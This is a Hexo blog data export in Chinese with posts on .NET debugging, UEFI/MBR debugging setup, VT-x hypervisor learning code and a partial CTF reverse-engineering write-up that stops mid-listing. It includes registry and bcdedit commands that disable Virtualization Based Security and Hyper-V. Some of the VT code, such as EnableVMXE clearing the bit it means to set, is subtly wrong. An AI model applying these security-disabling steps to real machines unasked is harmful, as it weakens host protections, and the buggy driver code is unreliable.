{"meta":{"title":"Hexo","subtitle":"","description":"","author":"Gyan","url":"https://gy4n.github.io","root":"/"},"pages":[{"title":"about","date":"1970-01-01T00:00:00.000Z","updated":"2023-05-09T05:16:55.840Z","comments":true,"path":"about/index.html","permalink":"https://gy4n.github.io/about/index.html","excerpt":"","text":"Gyan，每天都在和Microsoft斗智斗勇。"}],"posts":[{"title":"dotNet调试技巧","slug":"dotNet调试技巧","date":"2023-06-01T08:40:32.000Z","updated":"2023-06-02T13:01:33.712Z","comments":true,"path":"dotNet调试技巧/","link":"","permalink":"https://gy4n.github.io/dotNet%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/","excerpt":"介绍.NET平台下一些基础的调试技巧。","text":"介绍.NET平台下一些基础的调试技巧。 dnspy 调试Module BreakpointModule Breakpoint 可以看作DLL断点，支持在程序集加载时断下。当新增程序集后，会在Assembly Explorer出现新加载在内存中的程序集。 Class Breakpoint类断点，将整个类的所有方法全部下断点。 Condition Breakpoint &amp;&amp; Log BreakPoint输入框的内容可以为任意表达式，用&#123;&#125;描述表达式，如： 1command = &#123;this.command&#125; 输出的内容在输出中中，可以使用文件函数将其记录在日志。 这个输入框还可以读取预定义的一些关键字。 入口点除开入口点外，&lt;Module&gt;.cctor是模块的加载点。这是.NET程序的重点关注对象。 禁用.NET程序集优化当.NET程序集以调试器方式启动时，是默认关闭程序集优化的，但当以附加调试的情况调试时。 Windbg 调试使用Windbg 可以非常方便的进行混合模式的调试，可以理解为，Windbg作为Native代码调试器，加载了.NET调试的功能。 使用.loadby sos clr 加载托管调试。 在此之前，需要明白一些数据结构 .Net 数据结构的相互关系大致如下： 每个 .Net 应用程序都运行在一个或多个应用程序域 (Domain) 中，每个应用程序域都是一个独立的执行环境，可以加载和卸载程序集。 每个应用程序域都有一个基类 BaseDomain，它包含一些公共的数据结构和方法，例如 LoaderHeaps、ClassLoader、InterfaceVTableMapMgr 等。 每个应用程序域都有一个 SystemDomain 的引用，SystemDomain 是一个单例类，它表示 CLR 的初始化状态和全局数据结构，例如 GlobalStringLiteralMap、HandleTable、GCHeap 等。 SystemDomain 包含一个 SharedDomain 的引用，SharedDomain 是一个单例类，它表示所有应用程序域共享的数据结构，例如共享的 LoaderHeaps、共享的程序集等。 每个应用程序域都有一个或多个程序集 (Assembly)，每个程序集都包含一组 IL 模块和元数据。每个程序集都有一个 ClassLoader 的实例，负责加载类型和方法。 每个类型 (EEClass) 都有一个方法表 (MethodTable)，表示该类型的所有方法和字段。方法表包含指向方法描述符 (MethodDescriptor) 的指针，方法描述符表示方法的元数据信息和实现地址。方法表还包含接口映射表 (Interface Map)，表示该类型实现的接口和对应的方法表槽位。 每个对象实例 (ObjectInstance) 都有一个指向其类型的方法表的指针。对象实例还包含其字段值和同步块索引 (SyncBlockIndex)，后者指向同步块条目 (SyncTableEntry)，用于支持线程同步和垃圾回收等功能。 已知类的代码定位对于已知类名，需要定位EEClass，对于完整的方法也可以使用这个命令。 1!Name2EE DllName!ClassName 如： 12345670:000&gt; !Name2EE System.Management.Automation.dll!System.Management.Automation.PowerShellModule: 00007ff9b5791000Assembly: System.Management.Automation.dllToken: 0000000002000342MethodTable: 00007ff9b734f870EEClass: 00007ff9b5c13980Name: System.Management.Automation.PowerShell 和： 12345678910111213141516171819202122232425262728293031320:000&gt; !Name2EE mscorlib.dll!System.Threading.WaitHandle.WaitOneModule: 00007ffa0e721000Assembly: mscorlib.dllToken: 0000000006003d68MethodDesc: 00007ffa0e908d98Name: System.Threading.WaitHandle.WaitOne(Int32, Boolean)JITTED Code Address: 00007ffa0ece9c70-----------------------Token: 0000000006003d69MethodDesc: 00007ffa0e908da0Name: System.Threading.WaitHandle.WaitOne(System.TimeSpan, Boolean)JITTED Code Address: 00007ffa0f57aed0-----------------------Token: 0000000006003d6aMethodDesc: 00007ffa0e908da8Name: System.Threading.WaitHandle.WaitOne()JITTED Code Address: 00007ffa0ed0a040-----------------------Token: 0000000006003d6bMethodDesc: 00007ffa0e908db0Name: System.Threading.WaitHandle.WaitOne(Int32)JITTED Code Address: 00007ffa0f57af30-----------------------Token: 0000000006003d6cMethodDesc: 00007ffa0e908db8Name: System.Threading.WaitHandle.WaitOne(System.TimeSpan)JITTED Code Address: 00007ffa0f57af50-----------------------Token: 0000000006003d6dMethodDesc: 00007ffa0e908f50Name: System.Threading.WaitHandle.WaitOne(Int64, Boolean)JITTED Code Address: 00007ffa0f57af70 点击EEClass后，可以dump出这个类的属性 如： 123456789101112131415161718190:000&gt; !DumpClass /d 00007ff9b5c13980Class Name: System.Management.Automation.PowerShellmdToken: 0000000002000342File: C:\\WINDOWS\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dllParent Class: 00007ffa0e722f68Module: 00007ff9b5791000Method Table: 00007ff9b734f870Vtable Slots: 5Total Method Slots: 16Class Attributes: 100101 Transparency: CriticalNumInstanceFields: 25NumStaticFields: 0 MT Field Offset Type VT Attr Value Name00007ffa0e74b698 4000edb c0 System.Boolean 1 instance isGetCommandMetadataSpecialPipeline00007ff9b734f810 4000edc 8 ...omation.PSCommand 0 instance psCommand00007ff9b59216b0 4000edd 10 ...ment.Automation]] 0 instance extraCommands00007ffa0e74b698 4000ede c1 System.Boolean 1 instance runningExtraCommands...... 这其中有一个MT，MT是Method Table，是这个类的方法表： 使用!DumpMT -MD MTPointer 可以打印出该表中的所有MD（Method Descriptor） 如： 123456789101112131415160:000&gt; !DumpMT -MD 00007ff9b734f870EEClass: 00007ff9b5c13980Module: 00007ff9b5791000Name: System.Management.Automation.PowerShellmdToken: 0000000002000342File: C:\\WINDOWS\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dllBaseSize: 0xe8ComponentSize: 0x0Slots in VTable: 149Number of IFaces in IFaceMap: 1--------------------------------------MethodDesc Table Entry MethodDesc JIT Name00007ff9b68e70f0 00007ff9b5d30600 PreJIT System.Management.Automation.PowerShell.get_Commands()00007ff9b6148e30 00007ff9b5d310a8 PreJIT System.Management.Automation.PowerShell.AsPSPowerShellPipeline()...... MethodDesc 是非常重要的数据结构，直接点击MethodDesc，可以展示出该方法的IL代码地址，以及JIT后的地址。 Entry 即为方法的入口地址。 如： 这是直接DumpMD的结果 1234567890:000&gt; !DumpMD 00007ff9b5d310a8Method Name: System.Management.Automation.PowerShell.AsPSPowerShellPipeline()Class: 00007ff9b5c13980MethodTable: 00007ff9b734f870mdToken: 0000000006002eb6Module: 00007ff9b5791000IsJitted: yesCodeAddr: 00007ff9b68ee220Transparency: Critical 直接用这个地址使用命令DumpIL即可得到IL地址。如： 123456780:000&gt; !DumpIL 00007ff9b5d310a8ilAddr = 00007ff9b629dafcIL_0000: ldstr &quot;PS_PowerShellPipeline&quot;IL_0005: call System.Management.Automation.InternalMISerialize::CreateCimInstanceIL_000a: stloc.0 IL_000b: ldstr &quot;InstanceId&quot;IL_0010: ldarg.0...... 对这个CodeAddr点击，这可以反汇编JIT的代码，使用U命令 如： 123456789101112131415161718192021220:000&gt; !U /d 00007ff9b68ee220preJIT generated codeSystem.Management.Automation.PowerShell.AsPSPowerShellPipeline()Begin 00007ff9b68ee220, size 442&gt;&gt;&gt; 00007ff9`b68ee220 55 push rbp00007ff9`b68ee221 4156 push r1400007ff9`b68ee223 57 push rdi00007ff9`b68ee224 56 push rsi00007ff9`b68ee225 53 push rbx00007ff9`b68ee226 4883ec50 sub rsp,50h00007ff9`b68ee22a 488d6c2470 lea rbp,[rsp+70h]00007ff9`b68ee22f 488bf1 mov rsi,rcx00007ff9`b68ee232 488d7dc0 lea rdi,[rbp-40h]00007ff9`b68ee236 b908000000 mov ecx,800007ff9`b68ee23b 33c0 xor eax,eax00007ff9`b68ee23d f3ab rep stos dword ptr [rdi]00007ff9`b68ee23f 488bce mov rcx,rsi00007ff9`b68ee242 488965b0 mov qword ptr [rbp-50h],rsp00007ff9`b68ee246 488bf1 mov rsi,rcx00007ff9`b68ee249 488b0db8ac15ff mov rcx,qword ptr [System_Management_Automation_ni+0x2b8f08 (00007ff9`b5a48f08)] (MT: Microsoft.Management.Infrastructure.CimInstance)00007ff9`b68ee250 ff151a7072ff call qword ptr [System_Management_Automation_ni+0x885270 (00007ff9`b6015270)]...... 托管代码的调用堆栈需要切换到托管线程，使用 1!clrstack 或者 1!DumpStack 这个可以获得非托管和托管线程的代码。 如： 1234560:000&gt; !clrstackOS Thread Id: 0x36ec (0) Child SP IP Call Site000000a9266ed328 00007ffa36a64704 [HelperMethodFrame_1OBJ: 000000a9266ed328] System.Threading.WaitHandle.WaitOneNative(System.Runtime.InteropServices.SafeHandle, UInt32, Boolean, Boolean)000000a9266ed450 00007ffa0ece9ccc System.Threading.WaitHandle.InternalWaitOne(System.Runtime.InteropServices.SafeHandle, Int64, Boolean, Boolean)000000a9266ed480 00007ffa0ece9c9f System.Threading.WaitHandle.WaitOne(Int32, Boolean) 对象查看JIT的代码的调用规则和C代码编译的类似 rcx为this类，对应到该类，使用!do &lt;class addr&gt; 1234567890:006&gt; !do 000001ece82fd368Name: Microsoft.PowerShell.Commands.InvokeExpressionCommandMethodTable: 00007ff9dfe6b7d8EEClass: 00007ff9df3bcc58Size: 128(0x80) bytesFile: C:\\WINDOWS\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Utility\\v4.0_3.0.0.0__31bf3856ad364e35\\Microsoft.PowerShell.Commands.Utility.dllFields: MT Field Offset Type VT Attr Value Name00007ff9b71e9548 4002971 8 ...n.ICommandRuntime 0 instance 000001ece82fd458 commandRuntime 点击value即可进一步Dump类中的属性","categories":[],"tags":[{"name":"dotNet","slug":"dotNet","permalink":"https://gy4n.github.io/tags/dotNet/"},{"name":"Debug","slug":"Debug","permalink":"https://gy4n.github.io/tags/Debug/"}]},{"title":"UEFI+MBR调试踩坑合集","slug":"UEFI-MBR调试踩坑合集","date":"2023-05-09T06:10:13.000Z","updated":"2023-05-09T08:14:39.505Z","comments":true,"path":"UEFI-MBR调试踩坑合集/","link":"","permalink":"https://gy4n.github.io/UEFI-MBR%E8%B0%83%E8%AF%95%E8%B8%A9%E5%9D%91%E5%90%88%E9%9B%86/","excerpt":"记录一下UEFI + MBR 相关环境搭建上踩过的坑。","text":"记录一下UEFI + MBR 相关环境搭建上踩过的坑。 关闭Hyper-V在最新的Windows环境上，可能需要关闭Hyper-V，才能在VMware的虚拟机配置-处理器-虚拟化引擎中选中Intel VT-x/EPT 如果开启了Virtualization Based Security（基于虚拟化的安全性），请先关闭它 1reg ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f 再关闭Hyper-V 1bcdedit /set hypervisorlaunchtype off 如果只关闭Hyper-V，不关闭VBS，Hyper-V是关不掉的，我不知道为什么。 Vmware + IDA 调试请关闭Hyper-V 配置以下参数到VMX里面 1234debugStub.listen.guest32 = &quot;TRUE&quot;debugStub.hideBreakpoints = &quot;TRUE&quot;monitor.debugOnStartGuest32 = &quot;TRUE&quot;bios.bootDelay = &quot;10000&quot; 使用ida的IDA--&gt; Debugger--&gt; Attach--&gt; Remote GDB debugger 连接127.0.0.1:8832端口，启动虚拟机，之后在IDA弹出的窗口选择第一个。 按alt+s更改段为16位，给0x7c00下断点。 EDK2 + Windbg 调试因为目前的博客的介绍EDK2 + Windbg 调试的时间都在2020年，所以： 切换分支到202002的这个tag，回退版本到2020年。就可以支持Windbg + EDK2 的调试了。","categories":[],"tags":[{"name":"坑","slug":"坑","permalink":"https://gy4n.github.io/tags/%E5%9D%91/"},{"name":"调试","slug":"调试","permalink":"https://gy4n.github.io/tags/%E8%B0%83%E8%AF%95/"}]},{"title":"VT 技术学习","slug":"VT-技术学习","date":"2023-02-05T07:58:19.000Z","updated":"2023-05-16T09:07:36.780Z","comments":true,"path":"VT-技术学习/","link":"","permalink":"https://gy4n.github.io/VT-%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/","excerpt":"VT技术入门。","text":"VT技术入门。 0x00 VT 技术介绍0x01 VT 环境搭建在最新的Windows环境上，可能需要关闭Hyper-V，才能在VMware的虚拟机配置-处理器-虚拟化引擎中选中Intel VT-x/EPT 如果开启了Virtualization Based Security（基于虚拟化的安全性），请先关闭它 1reg ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f 再关闭Hyper-V 1bcdedit /set hypervisorlaunchtype off 如果只关闭Hyper-V，不关闭VBS，Hyper-V是关不掉的。如果还开启了UEFI 锁等复杂情况，就要参考微软文档了。 0x02 总体流程0x03 前置工作CPUIDeax = 1执行CPUID，ecx[5] = 1则支持VT-x 1234567int ret[4]; __cpuid(ret, 1); // 检查是否支持VT if (!(ret[2] &amp; 0x20)) &#123; // cpuid(1).ecx[5] == 1 return FALSE; &#125; msr检查VT-x是否在BIOS中被开启msr[0x3a]结果中的最低为为lock位，需要置1 1234uint64_t msr = __readmsr(0x3a);if (!(msr &amp; 1)) &#123; // msr[0x3a].lock == 1 return FALSE;&#125; CR4CR4中的第13位VMXE置1打开启用VMXE指令扩展 12345uintptr_t cr4 = __readcr4();// 检查VT-x 是否已经开启if (cr4 &amp; 0x2000) &#123; //cr4.VMXE == 0 return FALSE;&#125; 0x04 VMXON启用VMX扩展123456void inline EnableVMXE()&#123; uint32_t cr4 = __readcr4(); cr4 &amp;= ~0x2000; __writecr4(cr4);&#125; 分配VMXON 区域直接分配4k即可 1234PHYSICAL_ADDRESS HighAddress = &#123; 0 &#125;;g_cpu.pVMXONRegion = ExAllocatePoolWithTag(NonPagedPool, 0x1000, &#x27;vmon&#x27;);g_cpu.pVMXONRegion_PA = MmGetPhysicalAddress(g_cpu.pVMXONRegion);RtlZeroMemory(g_cpu.pVMXONRegion, 0x1000); 设置VMXON区域设置VMXON区域的四字节为msr[0x480]的低32位 123uintptr_t msr = __readmsr(0x480);*(ULONG*)(g_cpu.pVMXONRegion) = msr &amp; 0xffffffff; 执行VMXON指令，出错则CF位置1 12345push _highpush _lowvmxon dword ptr [esp]setc eaxadd esp,8 0x05 VMCSVMCS是Virtual Machine Control Structure，描述VM的一些属性。 首先需要初始化VMCS，再选中此VMCS。 1234// 初始化虚拟机__vmx_vmclear(*(uint64_t*)(&amp;g_cpu.pVMCSRegion_PA));// 选中此虚拟机__vmx_vmptrld(*(uint64_t*)(&amp;g_cpu.pVMCSRegion_PA)); Intel 弄了一个标准的汇编指令来读写VMCS，vmwrite/vmread，不推荐直接修改内存。 VMCS域 包括以下三方面的内容： 1.宿主机执行域 2.虚拟机执行域 3.虚拟机执行控制域 3.1 VM 执行控制(#VMExit 事件设置)44 3.2 VM 退出控制(#VMExit 保存内容设置) 3.3 VM 进入控制(进入#VMEntry 加载设置) 宿主机执行域 获取段描述符基址 1234567891011PVOID GetSegmentDescriptor(uint16_t index)&#123; KGDTENTRY* GdtEntry = Asm_GetGdtBase(); KGDTENTRY TargetEntry = GdtEntry[index &gt;&gt; 3]; uintptr_t ret = TargetEntry.HighWord.Bytes.BaseHi; ret &lt;&lt;= 8; ret |= TargetEntry.HighWord.Bytes.BaseMid; ret &lt;&lt;= 16; ret |= TargetEntry.BaseLow; return (PVOID)ret;&#125; HOST_RSP的值，需要提前申请 &amp; 0xfff8必须清除RPL，和TI 123456789101112131415161718192021222324252627__vmx_vmwrite(HOST_CR0, __readcr0());__vmx_vmwrite(HOST_CR3, __readcr3());__vmx_vmwrite(HOST_CR4, __readcr4());__vmx_vmwrite(HOST_ES_SELECTOR, GetES() &amp; 0xFFF8);__vmx_vmwrite(HOST_CS_SELECTOR, GetCS() &amp; 0xFFF8);__vmx_vmwrite(HOST_DS_SELECTOR, GetDS() &amp; 0xFFF8);__vmx_vmwrite(HOST_FS_SELECTOR, GetFS() &amp; 0xFFF8);__vmx_vmwrite(HOST_GS_SELECTOR, GetGS() &amp; 0xFFF8);__vmx_vmwrite(HOST_SS_SELECTOR, GetSS() &amp; 0xFFF8);__vmx_vmwrite(HOST_TR_SELECTOR, GetTR() &amp; 0xFFF8);// KGDTENTRY* GdtEntry = Asm_GetGdtBase();__vmx_vmwrite(HOST_TR_BASE, 0x80042000);__vmx_vmwrite(HOST_GDTR_BASE, Asm_GetGdtBase());__vmx_vmwrite(HOST_IDTR_BASE, Asm_GetIdtBase());__vmx_vmwrite(HOST_IA32_SYSENTER_CS, __readmsr(MSR_IA32_SYSENTER_CS) &amp; 0xFFFFFFFF);__vmx_vmwrite(HOST_IA32_SYSENTER_ESP, __readmsr(MSR_IA32_SYSENTER_ESP) &amp; 0xFFFFFFFF);__vmx_vmwrite(HOST_IA32_SYSENTER_EIP, __readmsr(MSR_IA32_SYSENTER_EIP) &amp; 0xFFFFFFFF); // KiFastCallEntry__vmx_vmwrite(HOST_RSP, ((ULONG)g_VMXCPU.pStack) + 0x2000); //Host 临时栈__vmx_vmwrite(HOST_RIP, (ULONG)VMMEntryPoint); //这里定义我们的VMM处理程序入口 很好，Intel你要提供HOST_TR_BASE，HOST_FS_BASE，HOST_GS_BASE 如果要它的话需要在GDT表找，然后拼接基地址。 这里偷了一份KGDTEntry的结构 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970typedef struct _KGDTENTRY&#123; USHORT LimitLow; //0x0 USHORT BaseLow; //0x2 union &#123; struct &#123; UCHAR BaseMid; //0x4 UCHAR Flags1; //0x5 UCHAR Flags2; //0x6 UCHAR BaseHi; //0x7 &#125; Bytes; //0x4 struct &#123; ULONG BaseMid : 8; //0x4 ULONG Type : 5; //0x4 ULONG Dpl : 2; //0x4 ULONG Pres : 1; //0x4 ULONG LimitHi : 4; //0x4 ULONG Sys : 1; //0x4 ULONG Reserved_0 : 1; //0x4 ULONG Default_Big : 1; //0x4 ULONG Granularity : 1; //0x4 ULONG BaseHi : 8; //0x4 &#125; Bits; //0x4 &#125; HighWord; //0x4&#125; KGDTENTRY;#else//0x10 bytes (sizeof)typedef union _KGDTENTRY&#123; struct &#123; USHORT LimitLow; //0x0 USHORT BaseLow; //0x2 &#125;; struct &#123; UCHAR BaseMiddle; //0x4 UCHAR Flags1; //0x5 UCHAR Flags2; //0x6 UCHAR BaseHigh; //0x7 &#125; Bytes; //0x4 struct &#123; struct &#123; ULONG BaseMiddle : 8; //0x4 ULONG Type : 5; //0x4 ULONG Dpl : 2; //0x4 ULONG Present : 1; //0x4 ULONG LimitHigh : 4; //0x4 ULONG System : 1; //0x4 ULONG LongMode : 1; //0x4 ULONG DefaultBig : 1; //0x4 ULONG Granularity : 1; //0x4 ULONG BaseHigh : 8; //0x4 &#125; Bits; //0x4 ULONG BaseUpper; //0x8 &#125;; struct &#123; ULONG MustBeZero; //0xc LONGLONG DataLow; //0x0 &#125;; LONGLONG DataHigh; //0x8&#125;KGDTENTRY; 虚拟机执行控制域 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455`GUEST_ES_AR_BYTES`为ES段的属性，设置为`0x10000`不可用。```c__vmx_vmwrite(GUEST_CR0, __readcr0());__vmx_vmwrite(GUEST_CR3, __readcr3());__vmx_vmwrite(GUEST_CR4, __readcr4());__vmx_vmwrite(GUEST_DR7, 0x400);__vmx_vmwrite(GUEST_RFLAGS, __readeflags() &amp; ~0x200); // IF = 0__vmx_vmwrite(GUEST_ES_SELECTOR, GetES() &amp; 0xFFF8);__vmx_vmwrite(GUEST_CS_SELECTOR, GetCS() &amp; 0xFFF8);__vmx_vmwrite(GUEST_DS_SELECTOR, GetDS() &amp; 0xFFF8);__vmx_vmwrite(GUEST_FS_SELECTOR, GetFS() &amp; 0xFFF8);__vmx_vmwrite(GUEST_GS_SELECTOR, GetGS() &amp; 0xFFF8);__vmx_vmwrite(GUEST_SS_SELECTOR, GetSS() &amp; 0xFFF8);__vmx_vmwrite(GUEST_TR_SELECTOR, GetTR() &amp; 0xFFF8);// 设置 Segment Unusable__vmx_vmwrite(GUEST_ES_AR_BYTES, 0x10000);__vmx_vmwrite(GUEST_FS_AR_BYTES, 0x10000);__vmx_vmwrite(GUEST_DS_AR_BYTES, 0x10000);__vmx_vmwrite(GUEST_SS_AR_BYTES, 0x10000);__vmx_vmwrite(GUEST_GS_AR_BYTES, 0x10000);__vmx_vmwrite(GUEST_LDTR_AR_BYTES, 0x10000);// 需要构造描述符线长、属性等，我要偷大懒// 在guest里面刷一下选择子__vmx_vmwrite(GUEST_CS_AR_BYTES, 0xc09b);__vmx_vmwrite(GUEST_CS_BASE, 0);__vmx_vmwrite(GUEST_CS_LIMIT, 0xffffffff);__vmx_vmwrite(GUEST_TR_AR_BYTES, 0x008b);__vmx_vmwrite(GUEST_TR_BASE, 0x80042000);__vmx_vmwrite(GUEST_TR_LIMIT, 0x20ab);__vmx_vmwrite(GUEST_GDTR_BASE, Asm_GetGdtBase());__vmx_vmwrite(GUEST_GDTR_LIMIT, Asm_GetGdtLimit());__vmx_vmwrite(GUEST_IDTR_BASE, Asm_GetIdtBase());__vmx_vmwrite(GUEST_IDTR_LIMIT, Asm_GetIdtLimit());__vmx_vmwrite(GUEST_IA32_DEBUGCTL, __readmsr(MSR_IA32_DEBUGCTL) &amp; 0xFFFFFFFF);__vmx_vmwrite(GUEST_IA32_DEBUGCTL_HIGH, __readmsr(MSR_IA32_DEBUGCTL) &gt;&gt; 32);__vmx_vmwrite(GUEST_SYSENTER_CS, __readmsr(MSR_IA32_SYSENTER_CS) &amp; 0xFFFFFFFF);__vmx_vmwrite(GUEST_SYSENTER_ESP, __readmsr(MSR_IA32_SYSENTER_ESP) &amp; 0xFFFFFFFF);__vmx_vmwrite(GUEST_SYSENTER_EIP, __readmsr(MSR_IA32_SYSENTER_EIP) &amp; 0xFFFFFFFF); // KiFastCallEntry__vmx_vmwrite(GUEST_RSP, ((ULONG)g_cpu.pStack) + 0x1000); //Guest 临时栈__vmx_vmwrite(GUEST_RIP, (ULONG)GuestEntry); // 客户机的入口点// 物理地址意义上的nullptr__vmx_vmwrite(VMCS_LINK_POINTER, 0xffffffff);__vmx_vmwrite(VMCS_LINK_POINTER_HIGH, 0xffffffff); GuestEntry是GUEST VM的入口点 __vmx_vmread(VM_INSTRUCTION_ERROR)@24.9.1 VM 控制域 通过设置Flags标志位来控制VM的一些行为，Intel为了防止你写玩具VMM的时候把这段全填0，贴心的设置了一些预留位需要置1的位，真好。 通过查询MSR寄存器来了解哪些预留位为1，哪些为0 比如 123456789101112kd&gt; rdmsr 481msr[481] = 0000003f`00000016kd&gt; .formats 0000003f`00000016Evaluate expression: Hex: 0000003f`00000016 Decimal: 270582939670 Octal: 0000000003740000000026 Binary: 00000000 00000000 00000000 00111111 00000000 00000000 00000000 00010110 Chars: ...?.... Time: Mon Jan 1 15:30:58.293 1601 (UTC + 8:00) Float: low 3.08286e-044 high 8.82818e-044 Double: 1.33686e-312 MSR值中前32位中二进制为0的位，设置对应域时该位必须为0 MSR值中后32位中二进制为1的位，设置对应域时该位必须为1 1234567ULONG VTAdjustExcuteControls(ULONG Value,ULONG msr)&#123; uint64_t mask = __readmsr(msr); Value &amp;= (mask &gt;&gt; 32); Value |= (mask &amp; 0xffffffff); return Value;&#125; VM 执行控制 Pin-Based VM-Execution Controls 基于CPU针脚的VM执行控制 （Intel 3a @24.6.1） 定义发生外部中断、NMI等的是否退出虚拟机。 1__vmx_vmwrite(PIN_BASED_VM_EXEC_CONTROL, VTAdjustExcuteControls(0, MSR_IA32_VMX_PINBASED_CTLS)); Processor-Based VM-Execution Controls 基于处理器的VM执行控制（Intel 3a @24.6.2） 定义执行一些CPU指令（HLT/INVLPG/RDTSC/CR3切换/内部中断）是否需要退出虚拟机 1__vmx_vmwrite(CPU_BASED_VM_EXEC_CONTROL, VTAdjustExcuteControls(0, MSR_IA32_VMX_PROCBASED_CTLS)); VM 退出控制 Intel &#x33;&#x61;&#64;&#x32;&#52;&#46;&#x37;&#46;&#x31; 1__vmx_vmwrite(VM_EXIT_CONTROLS, VTAdjustExcuteControls(0,MSR_IA32_VMX_EXIT_CTLS)); VM 进入控制 Intel &#x33;&#97;&#x40;&#x32;&#x34;&#x2e;&#x37;&#x2e;&#x31; 1__vmx_vmwrite(VM_ENTRY_CONTROLS, VTAdjustExcuteControls(0, MSR_IA32_VMX_ENTRY_CTLS)); 0x06 VM 启动启动后，CPU会跳到GUEST_RIP，ESP设置为GUEST_RSP 12345678910111213141516171819__asm&#123; pushad pushfd mov guest_sp,esp mov guest_ip, offset Ret&#125;// VMLANUCH 虚拟机启动，跳转到 GuestEntry 就不回来了__vmx_vmlaunch();// 这条指令下的语句不会执行DbgPrint(&quot;VT Failed With Error Code: 0x%x&quot;,__vmx_vmread(VM_INSTRUCTION_ERROR));// 这里的Ret是用来接收跳转，正常返回Ret: __asm&#123; popfd popad &#125; GuestEntry的定义 123456789101112131415161718192021222324252627__declspec(naked) void GuestEntry(void)&#123; __asm &#123; mov ax, es mov es, ax mov ax, ds mov ds, ax mov ax, fs mov fs, ax mov ax, gs mov gs, ax mov ax, ss mov ss, ax &#125; __asm &#123; mov esp, guest_sp jmp guest_ip &#125;&#125; 0x06 #VMExit当虚拟机执行到设置的#VMExit的指令后，会退出虚拟机，执行HOST_RIP函数。 1234567891011121314151617181920212223242526272829303132333435363738__declspec(naked) void VMExitHandler(void)&#123; __asm &#123; mov g_GuestRegs.eax, eax mov g_GuestRegs.ecx, ecx mov g_GuestRegs.edx, edx mov g_GuestRegs.ebx, ebx mov g_GuestRegs.esp, esp mov g_GuestRegs.ebp, ebp mov g_GuestRegs.esi, esi mov g_GuestRegs.edi, edi pushfd pop eax mov g_GuestRegs.eflags, eax mov ax, fs mov fs, ax mov ax, gs mov gs, ax &#125; VMExitHandlerDispatcher(); __asm &#123; mov eax, g_GuestRegs.eax mov ecx, g_GuestRegs.ecx mov edx, g_GuestRegs.edx mov ebx, g_GuestRegs.ebx mov esp, g_GuestRegs.esp mov ebp, g_GuestRegs.ebp mov esi, g_GuestRegs.esi mov edi, g_GuestRegs.edi //vmresume __emit 0x0f __emit 0x01 __emit 0xc3 &#125;&#125; VMExitHandlerDispatcher函数用于处理#VMExit事件： ExitReason指定了退出原因。 ExitInstructionLength指定了导致退出指令的长度。 g_GuestRegs.eip = __vmx_vmread(GUEST_RIP);读取了导致退出指令的地址。 处理完指令的退出后，设置GUEST_RIP为下一跳指令。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950static void VMExitHandlerDispatcher(void)&#123; ULONG ExitReason; ULONG ExitInstructionLength; ULONG GuestResumeEIP; ExitReason = __vmx_vmread(VM_EXIT_REASON); ExitInstructionLength = __vmx_vmread(VM_EXIT_INSTRUCTION_LEN); g_GuestRegs.eflags = __vmx_vmread(GUEST_RFLAGS); g_GuestRegs.esp = __vmx_vmread(GUEST_RSP); g_GuestRegs.eip = __vmx_vmread(GUEST_RIP); switch (ExitReason) &#123; case EXIT_REASON_CPUID: HandleCPUID(); Log(&quot;EXIT_REASON_CPUID&quot;, 0) break; case EXIT_REASON_VMCALL: HandleVmCall(); Log(&quot;EXIT_REASON_VMCALL&quot;, 0) break; case EXIT_REASON_CR_ACCESS: HandleCrAccess(); //Log(&quot;EXIT_REASON_CR_ACCESS&quot;, 0) break; case 19: case 20: case 21: case 22: case 23: case 24: case 25: case 26: case 27: break; default: Log(&quot;not handled reason: %p&quot;, ExitReason); __asm int 3 &#125; //Resume: GuestResumeEIP = g_GuestRegs.eip + ExitInstructionLength; __vmx_vmwrite(GUEST_RIP, GuestResumeEIP); __vmx_vmwrite(GUEST_RSP, g_GuestRegs.esp); __vmx_vmwrite(GUEST_RFLAGS, g_GuestRegs.eflags);&#125; 0x07 EPT看了一下要重建页表我就不想看了。 0x08 代码这个代码魔改的周壑的VT_Learn，建议不要乱魔改，坑非常多。","categories":[],"tags":[{"name":"VT","slug":"VT","permalink":"https://gy4n.github.io/tags/VT/"}]},{"title":"2022西湖论剑部分题目Writeup","slug":"2022西湖论剑部分题目Writeup","date":"2023-02-02T15:32:35.000Z","updated":"2023-05-16T09:08:48.420Z","comments":true,"path":"2022西湖论剑部分题目Writeup/","link":"","permalink":"https://gy4n.github.io/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/","excerpt":"题目链接详见：https://github.com/Randark-JMT/CTF_Archive/releases/tag/2022-xhlj","text":"题目链接详见：https://github.com/Randark-JMT/CTF_Archive/releases/tag/2022-xhlj re 部分dual personalitysub_401120 函数，将返回地址改成 jmp far 33:a2，跳转到64位 1234567891011121314151617int __cdecl sub_401120(size_t Size, int a2)&#123; char *v2; // ebx char *retaddr; // [esp+D0h] [ebp+4h] dword_407050 = VirtualAlloc(0, Size + 6, 0x3000u, 0x40u); dword_407000 = (int)dword_407050; memcpy(dword_407050, retaddr, Size); v2 = (char *)dword_407050 + Size; *v2 = 0xE9; *(_DWORD *)(v2 + 1) = &amp;retaddr[Size] - v2 - 5; v2[5] = 0xCC; *retaddr = 0xEA; *(_DWORD *)(retaddr + 1) = a2; *(_WORD *)(retaddr + 5) = 0x33; return 0;&#125; 需要在 call sub_401120的下一跳指令处下一个硬件断点 12ba e1 004013E8ba e1 00401467 注意到这一段是ret回来的，很像x64下的代码 1234567891011121314151617181920212223242526272829303132333435363738.text:0040146E 48 dec eax.text:0040146F 8B 04 25 C8 70 40 00 mov eax, dword_4070C8.text:00401476 48 dec eax.text:00401477 83 F8 20 cmp eax, 20h ; &#x27; 